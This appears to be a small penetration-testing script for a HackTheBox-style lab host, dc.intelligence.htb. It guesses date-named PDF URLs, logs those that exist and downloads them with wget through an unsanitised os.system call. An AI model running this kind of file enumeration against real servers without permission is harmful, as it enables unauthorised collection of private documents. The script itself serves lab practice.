#!/usr/bin/python3
# Author: Un9nPlayer
# Working : CyberSecurity , Penetration Tester.

import requests
import os

def fuzz_PDFs():
	with open('days', 'r') as d:
		days = d.readlines()

	with open('months' ,'r') as m:
		months = m.readlines()

	url_file = open('urls', 'w')
	url_file.close()

	for month in months:
		for day in days:
			r = requests.get(f'http://dc.intelligence.htb/documents/2020-{day.strip()}-{month.strip()}-upload.pdf')
			if int(r.status_code) == 200:
				print(f'http://dc.intelligence.htb/documents/2020-{day.strip()}-{month.strip()}-upload.pdf')

				with open('urls', 'a') as url_file:
					url_file.write(f'http://dc.intelligence.htb/documents/2020-{day.strip()}-{month.strip()}-upload.pdf')
					url_file.write('\n')

def get_PDFs():
	with open('urls', 'r') as u:
		urls = u.readlines()

	for url in urls:
		os.system(f"wget -q {url.strip()} ")
		print(f'[+] Downloading -- {url.strip()} ')


fuzz_PDFs()
get_PDFs()
